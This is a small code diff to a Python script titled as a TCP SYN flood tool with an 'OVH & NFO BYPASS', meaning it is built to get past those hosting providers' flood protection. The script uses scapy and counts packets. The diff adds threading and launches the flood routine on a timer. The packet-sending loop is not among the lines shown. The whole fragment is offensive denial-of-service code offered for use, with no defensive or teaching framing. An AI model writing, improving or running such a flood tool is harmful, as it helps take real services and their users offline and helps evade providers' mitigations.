@@ -1,6 +1,6 @@
 # TCP SYN FLOOD (OVH & NFO BYPASS)
 
-import socket
+import socket, threading
 from scapy.all import *
 
 def main():
@@ -22,4 +22,5 @@ def main():
         count   = count + 1
 
 if __name__ == "__main__":
-    main()
+    t = threading.Timer(1, main, ())
+    t.start()
